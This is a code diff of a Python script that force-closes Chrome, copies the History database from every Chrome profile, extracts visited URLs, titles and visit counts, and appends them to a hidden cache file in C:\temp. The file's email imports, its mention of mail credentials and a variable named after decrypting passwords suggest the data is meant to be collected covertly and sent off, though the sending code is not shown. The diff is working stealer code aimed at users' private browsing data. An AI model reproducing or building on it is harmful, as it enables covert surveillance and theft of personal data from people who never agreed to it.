@@ -4,7 +4,9 @@ import smtplib
 from email.message import EmailMessage
 import csv
 import os
-import browserhistory as bh
+import sqlite3
+import shutil
+# import browserhistory as bh
 
 # The mail addresses and password
 
@@ -18,35 +20,33 @@ def get_chrome_history():
         os.system("taskkill /f /im chrome.exe")
     except Exception:  # NOQA
         pass
-    
-    # copy getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\History", "rb" to temp folder
-    try:
-        dict_obj = bh.get_browserhistory()
-    except Exception:  # NOQA
-        pass
-    
-    i = 0
-    while True:
-        try:
-            if not os.path.exists("C:\\temp") or not os.path.isfile("C:\\temp\\.tempcache.csv"):
-                try:
-                    os.mkdir("C:\\temp\\")
-                except Exception:  # NOQA
-                    pass
-                try:
-                    open("C:\\temp\\.tempcache.csv", "w").close()
-                except Exception:  # NOQA
-                    pass
+
+    # base path for Chrome's User Data directory
+    base_path = os.path.join(os.getenv("APPDATA"), "..\\Local\\Google\\Chrome\\User Data")
+
+    # list all subdirectories in the User Data directory
+    profiles = [d for d in os.listdir(base_path) if os.path.isdir(os.path.join(base_path, d)) and (d.startswith('Profile') or d == 'Default')]
+
+    for profile in profiles:
+        history_path = os.path.join(base_path, profile, 'History')
+        print(history_path)
+        if os.path.exists(history_path):
+            temp_history_path = os.path.join("C:\\temp", f'{profile}_History')
+            shutil.copyfile(history_path, temp_history_path)
+
+            # connect to the SQLite database
+            conn = sqlite3.connect(temp_history_path)
+            cursor = conn.cursor()
+            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
 
             # write to csv file but don't delete the previous data
-            with open("C:\\temp\\.tempcache.csv", mode='a', newline='',
-                      encoding='utf-8') as decrypt_password_file:
-                decrypt_password_writer = csv.writer(decrypt_password_file, delimiter=',', quotechar='"',
-                                                     quoting=csv.QUOTE_MINIMAL)
-                decrypt_password_writer.writerow(dict_obj['chrome'][i])
-            i += 1
-        except Exception:  # NOQA (This will go hit a list out of index error, that's normal)
-            break
+            with open("C:\\temp\\.tempcache.csv", mode='a', newline='', encoding='utf-8') as decrypt_password_file:
+                decrypt_password_writer = csv.writer(decrypt_password_file, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
+                decrypt_password_writer.writerows(cursor.fetchall())
+
+            # close the database connection
+            conn.close()
+
 
 def clairvoyance():
     """
